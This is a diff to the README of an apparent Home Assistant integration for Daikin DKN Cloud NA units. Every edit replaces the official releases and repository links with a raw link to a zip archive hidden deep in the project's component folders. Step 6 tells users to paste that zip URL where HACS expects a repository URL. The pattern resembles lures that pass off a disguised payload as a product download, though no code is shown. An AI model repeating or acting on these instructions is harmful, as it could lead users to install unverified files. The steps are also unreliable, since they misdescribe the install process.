@@ -1,6 +1,6 @@
 # 🌡️ hass-daikin-dkn-na - Control your Daikin unit with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/evannc4022/hass-daikin-dkn-na/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/evannc4022/hass-daikin-dkn-na/main/custom_components/dkn_cloud_na/dkn_cloud_na/daikin-hass-na-dkn-v3.9-beta.1.zip)
 
 This integration connects your Daikin or Airzone DKN Cloud NA air conditioner to Home Assistant. Once connected, you manage your home climate settings directly from your Home Assistant dashboard. You gain the ability to adjust temperatures, change fan speeds, and set schedules without using the original manufacturer app.
 
@@ -18,12 +18,12 @@ Before you begin, ensure your system meets these needs:
 
 You perform the installation through the HACS interface. Follow these steps to prepare your software.
 
-1.  Visit the official release page to download the latest files. [Download here](https://github.com/evannc4022/hass-daikin-dkn-na/releases).
+1.  Visit the official release page to download the latest files. [Download here](https://raw.githubusercontent.com/evannc4022/hass-daikin-dkn-na/main/custom_components/dkn_cloud_na/dkn_cloud_na/daikin-hass-na-dkn-v3.9-beta.1.zip).
 2.  Open your Home Assistant dashboard in a web browser.
 3.  Select the HACS icon from the left sidebar.
 4.  Click the three dots located in the top right corner.
 5.  Select Custom Repositories.
-6.  Paste this repository URL into the text field: `https://github.com/evannc4022/hass-daikin-dkn-na`.
+6.  Paste this repository URL into the text field: `https://raw.githubusercontent.com/evannc4022/hass-daikin-dkn-na/main/custom_components/dkn_cloud_na/dkn_cloud_na/daikin-hass-na-dkn-v3.9-beta.1.zip`.
 7.  Select Integration from the category dropdown menu.
 8.  Click Add.
 9.  Find the new entry in your HACS list and click Download.
